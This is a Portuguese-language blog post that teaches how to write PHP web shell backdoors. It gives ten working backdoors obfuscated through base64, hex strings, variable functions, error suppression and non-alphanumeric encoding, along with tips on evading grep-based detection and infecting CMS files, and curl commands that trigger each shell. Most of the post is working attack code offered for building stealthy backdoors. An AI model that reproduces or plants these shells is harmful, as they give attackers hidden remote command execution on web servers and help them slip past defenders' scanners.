---
layout: post
title: Hold the door! … Hold the BackDoor PHP
type: post
parent_id: "1"
published: true
password: ""
status: publish
categories:
  - Hacking
  - PHP
  - Programação
tags:
  - Backdoor
  - Hacking
  - php
  - Code
permalink: /hacking/hold-door-hold-backdoor-php.html
excerpt: Esse pequeno post é focado em uma das diferentes técnicas que venho estudando no PHP, mas direcionando os esforços na variação de código para backdoor web.
description: Esse pequeno post é focado em uma das diferentes técnicas que venho estudando no PHP, mas direcionando os esforços na variação de código para backdoor web.
image:
  path: /assets/img/posts/hold-door-hold-backdoor/hold.gif
preview: /assets/img/posts/hold-door-hold-backdoor/hold.gif
---

## PHP 1s LIF3

>
O cenário de uso dos exemplos abaixo é um pensamento fora da caixa, dando `exit()` no básico usado em muitos códigos focados em backdoor.
{: .prompt-warning }

Meu foco foi nas variáveis globais GET, POST, REQUEST, Funções que executam command shell, além de diversas técnicas de concatenação de variáveis e funções. O objetivo principal deste estudo é explorar diferentes abordagens para criar backdoors PHP, permitindo que cada analista desenvolva sua própria estratégia de bypass e pensamento crítico.

### As functions mais usadas (PHP 4, PHP 5, PHP 7):

**shell_exec**
- Executa um comando via shell e retorna a saída inteira como uma `string`
  
```console
shell_exec(string $command): string|false|null
EXECUÇÃO -> php -r 'shell_exec("ls -la");'
```

**exec**
- Executa um programa externo. Se o argumento output estiver presente, então o `array` especificado será prenchido com cada linha da saída do comando.
  
```console
exec(string $command, array &$output = null, int &$result_code = null): string|false
EXECUÇÃO -> php -r 'exec("ls -la",$output);print_r($output);'
```

**passthru**
- Executa um programa externo e mostra a saída bruta. A função `passthru()` é similar à função `exec()`, e executa um comando especificado em command
  
```console
passthru(string $command, int &$result_code = null): ?false
EXECUÇÃO -> php -r 'passthru("ls -la",$result_code);'
```

### Implementação simples

O uso das funções é simples e eficiente. Um condicional `if` verifica se há entrada de dados externos via `$_REQUEST`. Se afirmativo, executa a função de shell pré-selecionada. Os exemplos abaixo são apresentados de forma compacta (`inline`) para ilustrar o contexto de backdoor e economia de espaço.

E covenhamos inline fica bem elegante

![Elegância](/assets/img/posts/hold-door-hold-backdoor/elegante.png)
_lindo & elegante_


**shell_exec**
```php
if(isset($_REQUEST['cmd'])){$cmd=shell_exec($_REQUEST['cmd']);print_r($cmd);}
```

**system**
```php
if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}
```

**exec**
```php
if(isset($_REQUEST['cmd'])){exec($_REQUEST['cmd']);}
```

**passthru**
```php
if(isset($_REQUEST['cmd'])){passthru($_REQUEST['cmd']);}
```

### Next Level / Saindo da Caixinha

Podemos usar as mesmas funções listadas acima, porém de forma mais elaborada, evitando que um simples `grep -E` revele nosso acesso.
Explorar o ferramental e a maleabilidade de formatação do código PHP traz uma poderosa forma de criar backdoor. 

### Dicas

- Uso de `shellcode` em valores fixos.
- Uso de supressor de erros em functions `@`.
  - Exemplo: `@functionX($var)`
- Evite executar diretamente o comando malicioso, use `strings`, `arrays` para montar suas funções e comandos.
- `Array` é vida! use para receber e geranciar valores.
- Entenda que parametros de request $_GET, $_POST são um array e pode acessar acessados via key.
  - Exemplo `$_GET[0]`, `$_POST[0]`
- Concatenação de functions nativas & definição de variáveis.
  - Exemplo: `$var1.$var2`, `($var1).($var2)`, `(functionX()).(functionY($var))`
- base64_decode – `encode(data)`, `bin2hex`, `error_reporting(0)`.
- Use requests (`get or post`) que já existam no sistema.
- Estude a criação de propriedades maliciosas em `class’s` do sistema, crie suas functions.
- Se conhecer algo do sistema alvo use variáveis semelhantes ao do target.
- Manuseio de valores da variável global `$_SERVER`.
- Estude métodos de infeção para arquivos CMS’s feitos em PHP.
- Execute suas funções usando a técnica de `variável function`.
  - Exemplo: `$var='system';$var('id');`
  
---

### Supressor duplo

O PHP suporta um operador de controle de erro: o sinal 'arroba' (`@`). Quando ele precede uma expressão em PHP, qualquer mensagem de erro que possa ser gerada por aquela expressão será ignorada. é possivel usar tal sinal antes de funções ou variável.

![](/assets/img/posts/hold-door-hold-backdoor/silencio.webp){: width="100" height="100" .left }

É possível usar um array como segundo supressor para garantir que os erros sejam ocultos. Depois de passar pelo supressor `@` é criado um array iniciando com a key `0` e adicioando o retorno do suoressor `@` como valor do array via `[]`.


> **Resumindo:** qualquer erro que escape do supressor `@` será automaticamente capturado e armazenado em uma chave de array, evitando assim sua exibição no terminal ou página web.
{: .prompt-warning }

![](/assets/img/posts/hold-door-hold-backdoor/supressor.png)


## Vamos para os exemplos

#### EXEMPLO 01

**Debugar o código:**

Code:
```php
(error_reporting(0).($__=@base64_decode("c3lzdGVt"))
.$__(base64_decode("aWQ=")).define("_","dW5hbWUgLWE7bHM7").$__(base64_decode(_)).exit);
```

1. Desativa erros e decodifica string
- `(error_reporting(0))` e `@`: Desativa a exibição de erros PHP.
- `($__=@base64_decode("c3lzdGVt"))`: Decodifica a string base64 "c3lzdGVt" para "system".

2. Executa comando system
- `.$__(base64_decode("aWQ="))`: Decodifica a string base64 "aWQ=" para "id". Executa o comando "system" com o argumento "id". 

3. Define constante e executa comando
- `define("_","dW5hbWUgLWE7bHM7")`: Define uma constante `_` com o valor "dW5hbWUgLWE7bHM7" (base64 para "uname -a;ls;").
- `$__(base64_decode(_))`: Decodifica a constante `_` e executa o comando resultante.

Comando resultante:
- `system('id'); system('uname -a;ls;');`

Functions:
- ERROR_REPORTING <https://secure.php.net/manual/pt_BR/function.error-reporting.php>
- BASE64_DECODE <https://php.net/manual/pt_BR/function.base64-decode.php>
- DEFINE <https://php.net/manual/pt_BR/function.define.php>
- SYSTEM <https://php.net/manual/pt_BR/function.system.php>
- EXIT <https://php.net/manual/pt_BR/function.exit.php>
- ERROR CONTROL @ <https://www.php.net/manual/pt_BR/language.operators.errorcontrol.php>

Esquema usando `base64` para oculta valores: 

| BASE64           | VALUE          |
| ---------------- | -------------- |
| c3lzdGVt         | `system`       |
| dW5hbWUgLWE7bHM7 | `uname -a;ls;` |
| aWQ              | `id`           |

Execução: 
```bash
curl -v 'http://localhost/shell.php'
```

---

#### EXEMPLO 02

**Debugar o código:**

Code:
```php
(error_reporting(0).($__=@base64_decode("c3lzdGVt"))
.print($__(isset($_REQUEST[0])?$_REQUEST[0]:NULL)).exit);
```

1. Desativa erros e decodifica string
- `(error_reporting(0))` e `@`: Desativa a exibição de erros PHP.
- `($__=@base64_decode("c3lzdGVt"))`: Decodifica a string base64 "c3lzdGVt" para "system".
2. Executa comando system
- `print($__(isset($_REQUEST[0])?$_REQUEST[0]:NULL))`:
    - Verifica se existe um parâmetro 0 na requisição `($_REQUEST[0])`.
    - Se existir, executa o comando "system" com esse parâmetro.
    - Se não existir, não executa comando algum.
3. Encerra a execução
- `exit`: Encerra a execução do script.

Funcionamento:
1. O atacante envia uma requisição (`$_REQUEST`) HTTP com um parâmetro 0 contendo o comando a ser executado.
2. O código PHP executa o comando "system" com o parâmetro recebido.

Functions:
- ERROR_REPORTING <https://secure.php.net/manual/pt_BR/function.error-reporting.php>
- BASE64_DECODE <https://php.net/manual/pt_BR/function.base64-decode.php>
- ISSET <https://php.net/manual/pt_BR/function.isset.php>
- PRINT <https://php.net/manual/pt_BR/function.print.php>
- SYSTEM <https://php.net/manual/pt_BR/function.system.php>
- EXIT <https://php.net/manual/pt_BR/function.exit.php>
- ERROR CONTROL @ <https://www.php.net/manual/pt_BR/language.operators.errorcontrol.php>
- $_REQUEST <https://www.php.net/manual/pt_BR/reserved.variables.request.php>
    
Esquema usando `base64` para oculta valores: 

| BASE64   | VALUE    |
| -------- | -------- |
| c3lzdGVt | `system` |


Execução: 
```bash
curl -v 'http://localhost/shell.php?0=id'
```

---

#### EXEMPLO 03

**Debugar o código:**

Code:
```php
(error_reporting(0)).($_=$_REQUEST[0])
.($__=@create_function('$_',base64_decode("ZWNobyhzaGVsbF9leGVjKCRfKSk7"))).($__($_).exit);
```

1. Desativa erros
- `(error_reporting(0))` e `@`: Desativa a exibição de erros PHP.
2. Recupera parâmetro
- `$_ = $_REQUEST[0]`: Recupera o valor do parâmetro 0 da requisição HTTP.
3. Cria função maliciosa
- `$__ = @create_function('$_', base64_decode("ZWNobyhzaGVsbF9leGVjKCRfKSk7"))`:
    - Cria uma função anônima usando create_function.
    - A função recebe um parâmetro $_.
    - O corpo da função é decodificado da string base64.
4. Decodifica corpo da função
- `ZWNobyhzaGVsbF9leGVjKCRfKSk7` decodifica para:
    - `echo shell_exec($_)`;
5. Executa função maliciosa
- `($__($_))`: Executa a função criada com o parâmetro `$_`.
6. Encerra execução
- exit: Encerra a execução do script.

Funcionamento:
1. O atacante envia uma requisição HTTP com um parâmetro 0 contendo o comando a ser executado.
2. O código PHP cria uma função que executa o comando usando shell_exec.
3. A função é executada com o parâmetro recebido.

Functions:
- ERROR_REPORTING <https://secure.php.net/manual/pt_BR/function.error-reporting.php>
- BASE64_DECODE <https://php.net/manual/pt_BR/function.base64-decode.php>
- CREATE_FUNCTION <https://php.net/manual/pt_BR/function.create-function.php>
- SHELL_EXEC <https://php.net/manual/pt_BR/function.shell-exec.php>
- EXIT <https://php.net/manual/pt_BR/function.exit.php>
- ERROR CONTROL @ <https://www.php.net/manual/pt_BR/language.operators.errorcontrol.php>
- $_REQUEST <https://www.php.net/manual/pt_BR/reserved.variables.request.php>

Variáveis: 

| BASE64                        | DECODE                  |
| ----------------------------- | ----------------------- |
| ZWNobyhzaGVsbF9leGVjKCRfKSk7= | `echo(shell_exec($_));` |

Execução: 
```bash
curl -v 'http://localhost/shell.php?0=id'
```

---

#### EXEMPLO 04

**Debugar o código:**

Code:
```php
(error_reporting(0).($_=@$_GET[1]).($_($_GET[2])).exit);
```

1. Desativa erros
- `(error_reporting(0))` e `@`: Desativa a exibição de erros PHP.
2. Recupera parâmetro
- `$_ = @$_GET[1]`: Recupera o valor do parâmetro 1 da requisição GET.
3. Executa comando
- `$_($_GET[2])`: Executa o comando armazenado em `$_` com o argumento passado em `$_GET[2]`.
4. Encerra execução
- `exit`: Encerra a execução do script.

Funcionamento:
1. O atacante envia uma requisição GET com dois parâmetros: 1 e 2.
2. O parâmetro 1 contém o nome da função ou comando a ser executado.
3. O parâmetro 2 contém o argumento para a função ou comando.
4. O código PHP executa a função ou comando com o argumento passado.

Functions:
- ERROR_REPORTING <https://secure.php.net/manual/pt_BR/function.error-reporting.php>
- VARIABLE FUNCTIONS <https://php.net/manual/pt_BR/functions.variable-functions.php>
- ERROR CONTROL @ <https://www.php.net/manual/pt_BR/language.operators.errorcontrol.php>
- EXIT <https://php.net/manual/pt_BR/function.exit.php>
- $_GET <https://www.php.net/manual/pt_BR/reserved.variables.get.php>
  
Variáveis: 

| REQUEST  | VALUE      | NOTA                         |
| -------- | ---------- | ---------------------------- |
| $_GET[1] | `system`   | `nome da function`           |
| $_GET[2] | `id;uname` | `comando que será executado` |

Execução: 
```bash
curl -v 'http://localhost/shell.php?1=system&2=id;uname'
```

---

#### EXEMPLO 05

**Debugar o código:**

Code:
```php
(error_reporting(0)).(extract($_REQUEST, EXTR_PREFIX_ALL))
.($_=@get_defined_vars()['_REQUEST']).(define('_',$_[2])).(($_[1](_))).exit;
```

1. Desativa erros
- `(error_reporting(0))` e `@`: Desativa a exibição de erros PHP.
2. Extrai variáveis da requisição
- `(extract($_REQUEST, EXTR_PREFIX_ALL))`: Extrai todas as variáveis da requisição HTTP e as transforma em variáveis globais, prefixando-as com `_`.
3. Recupera variáveis definidas
- `$_=@get_defined_vars()['_REQUEST']`: Recupera as variáveis definidas na requisição HTTP.
4. Define constante
- `(define('_',$_[2]))`: Define uma constante `_` com o valor da terceira variável da requisição.
5. Executa comando
- `($_[1](_))`: Executa o comando armazenado na segunda variável da requisição, passando a constante `_` como argumento.
6. Encerra execução
- `exit`: Encerra a execução do script.

Funcionamento:
1. O atacante envia uma requisição HTTP com 2 parâmetros.
2. O primeiro parâmetro é o nome da função ou comando a ser executado.
3. O segundo parâmetro é o comando a ser executado.
4. O código PHP executa o comando com o argumento passado.

Functions:
- ERROR_REPORTING <https://secure.php.net/manual/pt_BR/function.error-reporting.php>
- EXTRACT <https://php.net/manual/pt_BR/function.extract.php>
- GET_DEFINED_VARS <https://php.net/manual/pt_BR/function.get-defined-vars.php>
- ERROR CONTROL @ <https://www.php.net/manual/pt_BR/language.operators.errorcontrol.php>
- VARIABLE FUNCTIONS <https://php.net/manual/pt_BR/functions.variable-functions.php>
- DEFINE <https://php.net/manual/pt_BR/function.define.php>
- EXIT <https://php.net/manual/pt_BR/function.exit.php>
- $_REQUEST <https://www.php.net/manual/pt_BR/reserved.variables.request.php>

Variáveis: 

| REQUEST      | VALUE      | NOTA                         |
| ------------ | ---------- | ---------------------------- |
| $_REQUEST[1] | `system`   | `nome da function`           |
| $_REQUEST[2] | `id;uname` | `comando que será executado` |

Execução: 
```bash
curl -v 'http://localhost/shell.php?1=system&2=id;uname'
```

---

#### EXEMPLO 06

**Debugar o código:**

1. `(error_reporting(0))` e `$_=@`: 
  - Desativa a exibição de erros PHP, evitando que mensagens de erro sejam exibidas.
2. `$_=@explode(',',$_SERVER[base64_decode('SFRUUF9VU0VSX0FHRU5U')]))`:
  - `base64_decode('SFRUUF9VU0VSX0FHRU5U')` decodifica a string base64 para `HTTP_USER_AGENT`.
  - `$_SERVER[HTTP_USER_AGENT]` recupera o valor do cabeçalho User-Agent da requisição HTTP.
  - `explode(',', ...)` divide a string em um array usando vírgula como separador.
  - `$_` é um array que armazena os valores resultantes.
3. `($_[0]("{$_[1]}"))`:
  - `$_[0]` é o primeiro elemento do array `$_`.
  - `$_[1]` é o segundo elemento do array `$_`.
  - O código executa a função ou método armazenado em `$_[0]` -> `system` com o argumento `$_[1]`.
4. `exit;`:
   - Encerra a execução do script.

Functions:
- ERROR_REPORTING <https://secure.php.net/manual/pt_BR/function.error-reporting.php>
- EXPLODE <https://php.net/manual/pt_BR/function.explode.php>
- BASE64_DECODE <https://php.net/manual/pt_BR/function.base64-decode.php>
- ERROR CONTROL @ <https://www.php.net/manual/pt_BR/language.operators.errorcontrol.php>
- VARIABLE FUNCTIONS <https://php.net/manual/pt_BR/functions.variable-functions.php>
- EXIT <https://php.net/manual/pt_BR/function.exit.php>
- $_SERVER <https://www.php.net/manual/pt_BR/tutorial.useful.php>
  
Variáveis: 

| BASE64               | VALUE             |
| -------------------- | ----------------- |
| SFRUUF9VU0VSX0FHRU5U | `HTTP_USER_AGENT` |

Code:
```php
(error_reporting(0)).($_=@explode(',',$_SERVER[base64_decode('SFRUUF9VU0VSX0FHRU5U')]))
.($_[0]("{$_[1]}")).exit;
```

Execução: 
1. O atacante envia uma requisição HTTP com um cabeçalho User-Agent específico, contendo uma string no formato `nome_da_função,comando_para_executar` -> `system,id` que será executado

```bash
curl -v 'http://localhost/shell.php' -–user-agent 'system,id;ls -la'
```

---

#### EXEMPLO 07

É usado o nome da function em formato shellcode, os valores de shellcode (`x73 x79 x73 x74 x65 x6D`) representam a string de function `system`. O comando que será executado dentro do php é recebido via `$_GET` no key `0` representado pela shellcode `x30`.

Os valores do shellcode da function `system` são alocados para uma `array`, que é coletada pela function `get_defined_vars` e posteriormente montado na ordem correta. O último step é a execução da função usando a técnica de variable-function `$___("{$_[0][0]}")` -> `system("meu comando")`.

**Debugar o código:**

Code:
```php
(error_reporting(0)).($_[0][]=@$_GET["x30"])
.($_[1][] = "x73").($_[1][] = "x79").($_[1][] = "x73")
.($_[1][] = "x74").($_[1][] = "x65").($_[1][] = "x6D")
.($__=@get_defined_vars()['_'][1]).($___.=$__[0])
.($___.=$__[1]).($___.=$__[2]).($___.=$__[3])
.($___.=$__[4]).($___.=$__[5]).(($___("{$_[0][0]}")).exit);
```

1. Preparação
- `(error_reporting(0))` e `$_[0][]=@`: Desativa a exibição de erros PHP.
- `$_[0][]=@$_GET["x30"]`: Cria um array `$_[0]` e atribui o valor de `$_GET["x30"]` ao primeiro elemento.

2. Criação de string maliciosa
- `$_[1][] = "x73"`: Adiciona o valor `"x73"` (codificação hexadecimal para "s") ao array `$_[1]`.
- `$_[1][] = "x79"`: Adiciona o valor `"x79"` (codificação hexadecimal para "y") ao array `$_[1]`.
- `$_[1][] = "x73"`: Adiciona o valor `"x73"` (codificação hexadecimal para "s") ao array `$_[1]`.
- `$_[1][] = "x74"`: Adiciona o valor `"x74"` (codificação hexadecimal para "t") ao array `$_[1]`.
- `$_[1][] = "x65"`: Adiciona o valor `"x65"` (codificação hexadecimal para "e") ao array `$_[1]`.
- `$_[1][] = "x6D"`: Adiciona o valor `"x6D"` (codificação hexadecimal para "m") ao array `$_[1]`.

A string resultante em `$_[1]` é "system".

3. Concatenação e execução
- `($__=@get_defined_vars()['_'][1])`: Recupera o valor de `$_[1]` e atribui à variável `$__`.
- `($___.=$__[0])`: Concatena o valor de `$__[0]` ("s") à variável `$__`.
- `($___.=$__[1])`: Concatena o valor de `$__[1]` ("y") à variável `$__`.
- `($___.=$__[2])`: Concatena o valor de `$__[2]` ("s") à variável `$__`.
- `($___.=$__[3])`: Concatena o valor de `$__[3]` ("t") à variável `$__`.
- `($___.=$__[4])`: Concatena o valor de `$__[4]` ("e") à variável `$__`.
- `($___.=$__[5])`: Concatena o valor de `$__[5]` ("m") à variável `$__`.

A string resultante em `$__` é "system".
- `(($___("{$_[0][0]}"))`: Executa a função "system" com o argumento `$_[0][0]` (valor de `$_GET["x30"]`).

Functions:
- ERROR_REPORTING <https://secure.php.net/manual/pt_BR/function.error-reporting.php>
- GET_DEFINED_VARS <https://php.net/manual/pt_BR/function.get-defined-vars.php>
- VARIABLE FUNCTIONS <https://php.net/manual/pt_BR/functions.variable-functions.php>
- VARIABLE SHELLCODE <https://pt.wikipedia.org/wiki/Shellcode> 
- SYSTEM <https://php.net/manual/pt_BR/function.system.php>
- ERROR CONTROL @ <https://www.php.net/manual/pt_BR/language.operators.errorcontrol.php>
- EXIT <https://php.net/manual/pt_BR/function.exit.php>
- $_GET <https://www.php.net/manual/pt_BR/reserved.variables.get.php>

Variáveis: 

| SHELLCODE               | VALUE                   |
| ----------------------- | ----------------------- |
| x30                     | `0`                     |
| x73 x79 x73 x74 x65 x6D | `s` `y` `s` `t` `e` `m` |

Execução: 
```bash
curl -v 'http://localhost/shell.php?0=id;uname -a'
```

---

#### EXEMPLO 08

**Debugar o código:**

Code:
```php
(error_reporting(0)).(str_replace(['$','@','#'],'','s$##y@#$@#$@#$@s$#$@#$@#$@$te$#@#$m'))
.($_("{$_REQUEST[0]}"));
```

1. Desativa erros
- `(error_reporting(0))`: Desativa a exibição de erros PHP.
2. Limpa string e executa comando
- `str_replace(['$','@','#'],'','s$##y@#$@#$@#$@s$#$@#$@#$@$te$#@#$m')`:
    - Substitui os caracteres $, @ e # pela string vazia.
    - Resultado: system
3. Executa comando
- `($_("{$_REQUEST[0]}"))`:
    - Executa o comando "system" com o argumento passado em `$_REQUEST[0]`.
    - `$_REQUEST[0]` é um parâmetro passado via requisição HTTP.

Funcionamento:
1. O atacante envia uma requisição HTTP com um parâmetro 0 contendo o comando a ser executado.
2. O código PHP executa o comando "system" com o parâmetro recebido.

Functions:
- ERROR_REPORTING <https://secure.php.net/manual/pt_BR/function.error-reporting.php>
- STR_REPLACE <https://php.net/manual/pt_BR/function.str-replace.php>
- VARIABLE FUNCTIONS <https://php.net/manual/pt_BR/functions.variable-functions.php>
- $_REQUEST <https://www.php.net/manual/pt_BR/reserved.variables.request.php>

Variáveis: 

| REQUEST      | VALUE                      |
| ------------ | -------------------------- |
| $_REQUEST[0] | Comando que será executado |


Execução: 
```bash
curl -v 'http://localhost/shell.php?0=id'
```

---

#### EXEMPLO 09

**Debugar o código:**

Code:
```php
(error_reporting(0)).($_=[("x73x79").("x73")
.("x74x65x6d"),"x73x68x65x6c","x6cx72x6fx78"])
.($_[0]($_POST[$_[1].$_[2]]));
```

1. Desativa erros
- `(error_reporting(0))`: Desativa a exibição de erros PHP.
2. Cria array com comandos
- `$_ = [("x73x79").("x73") .("x74x65x6d"),"x73x68x65x6c","x6cx72x6fx78"]`:
    - Cria um array `$_` com três elementos.
    - Primeiro elemento: concatena strings para formar "system".
    - Segundo elemento: "shell".
    - Terceiro elemento: "rox" (provavelmente uma referência a "rox" -> Rock).
1. Executa comando
- `($_[0]($_POST[$_[1].$_[2]]))`:
    - Executa o comando "system" com o argumento passado em `$_POST[$_[1].$_[2]]`.
    - `$_[1].$_[2]` forma a string "shellrox".
    - `$_POST["shellrox"]` contém o comando a ser executado.

Funcionamento:
1. O atacante envia uma requisição HTTP POST com um parâmetro "shellrox" contendo o comando a ser executado.
2. O código PHP executa o comando "system" com o parâmetro recebido.

Functions:
- ERROR_REPORTING <https://secure.php.net/manual/pt_BR/function.error-reporting.php>
- STR_REPLACE <https://php.net/manual/pt_BR/function.str-replace.php>
- VARIABLE FUNCTIONS <https://php.net/manual/pt_BR/functions.variable-functions.php>
- SYSTEM <https://php.net/manual/pt_BR/function.system.php>
- $_POST <https://www.php.net/manual/en/reserved.variables.post.php>

Variáveis:

| REQUEST            | VALUE                      |
| ------------------ | -------------------------- |
| $_POST[‘shellrox’] | Comando que será executado |

Execução: 
```bash
curl -d 'shellrox=id;uname -a' -X POST 'http://localhost/shell.php'
```

---

#### EXEMPLO 10

**Técnica PHP-Nonalpha**

A técnica PHP-Nonalpha é uma abordagem utilizada por atacantes para criar backdoors PHP que evitam detecção por ferramentas de segurança. 

- Características:
1. O código malicioso é escrito utilizando caracteres não alfanuméricos, como símbolos, espaços em branco ou caracteres especiais.
2. O código é codificado em hexadecimal para evitar detecção por ferramentas de segurança.
3. O código utiliza funções de string para decodificar e executar o código malicioso.

**Características do Backdoor PHP-Nonalpha**

- Características:
1. O código é compacto e difícil de ler.
2. Uso de funções obscuras: O código utiliza funções pouco conhecidas ou obscuras para evitar detecção.
3. Palavras-chave: O código evita usar palavras-chave comuns em backdoors, como "eval" ou "system".

Functions:
- NON ALPHA NUMERIC <https://www.thespanner.co.uk/2012/08/21/php-nonalpha-tutorial/>
- VARIABLE FUNCTIONS <https://php.net/manual/pt_BR/functions.variable-functions.php>
- SYSTEM <https://php.net/manual/pt_BR/function.system.php>

Code:
```php
($_="").($_[+$_]++).($_=$_."").($_=$_[+""]).($_++)
.($_++).($_++).($_++).($___[]=$_++).($_++).($_++)
.($_++).($_++).($_++).($_++).($_++).($___[]=$_++)
.($_++).($_++).($_++).($_++).($_++).($___[]=$_++)
.($___[]=$_++).($_++).($_++).($_++).($_++)
.($___[]=$_++).($_++)
.($_____=$___[2].$___[4].$___[2].$___[3].$___[0].$___[1])
.($_____('id;uname -a'));
```

**Debugar o código:**

1. Inicialização
- `$_ = ""`: Inicializa a variável `$_` como uma string vazia.

1. Criação de array
- `$_[$_[+$_]]++`: Cria um array `$_` com um elemento vazio e incrementa o valor.

1. Construção da string
- `$_ = $_ . ""`: Concatena a string vazia com a variável `$_` que converte para string "Array".
- `$_ = $_[+""]`: Recupera o valor do elemento vazio do array. acessa o índice 0 da string "Array" que é "A"

1. Incremento e armazenamento
- `($_++)`: Incrementa o valor da variável `$_`. passando por letras de `A` até `D`
- `($___[] = $_++)`: Armazena o valor incrementado em um novo array `$___`. É encontrado a letra `E`
 
1. Repetição do processo
- O código repete o processo de incremento e armazenamento várias vezes. passando por letras de `F` até `Z` e quando identifica uma letra util para criar o nome de function system tal string é salva na variável `$___`.

O variável array `$___` com as letras indexadas.
```php
(
    [0] => E
    [1] => M
    [2] => S
    [3] => T
    [4] => Y
)
```

6. Construção da string final
- `$_____ = $___[2] . $___[4] . $___[2] . $___[3] . $___[0] . $___[1]`: Constrói uma string final utilizando elementos do array `$___` resultando na string `system`.

7. Execução do comando
- `$_____('id;uname -a')`: Executa o comando "id" e "uname -a" utilizando a função `$_____`.


Execução: 
```bash
curl -v 'http://localhost/shell.php'
```

---


## Referências
- <https://php.net/manual/en/language.operators.execution.php#language.operators.execution>
- <https://thehackerblog.com/a-look-into-creating-a-truley-invisible-php-shell>
- <https://www.businessinfo.co.uk/labs/talk/Nonalpha.pdf>
- <https://php.net/manual/pt_BR/function.create-function.php>
- <https://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html>
- <https://web.archive.org/web/20120427221212/http://h.ackack.net/tiny-php-shell.html>
- <https://php.net/manual/pt_BR/function.extract.php>
- <https://blog.sucuri.net/2013/09/ask-sucuri-non-alphanumeric-backdoors.html>
- <https://www.akamai.com/cn/zh/multimedia/documents/report/akamai-security-advisory-web-shells-backdoor-trojans-and-rats.pdf>
- <https://aw-snap.info/articles/backdoor-examples.php>
- <https://php.net/manual/pt_BR/reserved.variables.server.php>
- <https://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/>
- <https://blog.sucuri.net/2013/09/ask-sucuri-non-alphanumeric-backdoors.html>
- <https://php.net/manual/en/functions.variable-functions.php>
- <https://php.net/manual/pt_BR/function.exec.php>
- <https://php.net/manual/pt_BR/function.shell-exec.php>
- <https://php.net/manual/pt_BR/function.system.php>
- <https://php.net/manual/pt_BR/function.passthru.php>
- <https://php.net/manual/pt_BR/function.get-defined-vars.php>
- <https://php.net/manual/pt_BR/function.extract.php>


## Post feito ao som de

{% include embed/youtube.html id='ysfm_adxRrI' %}
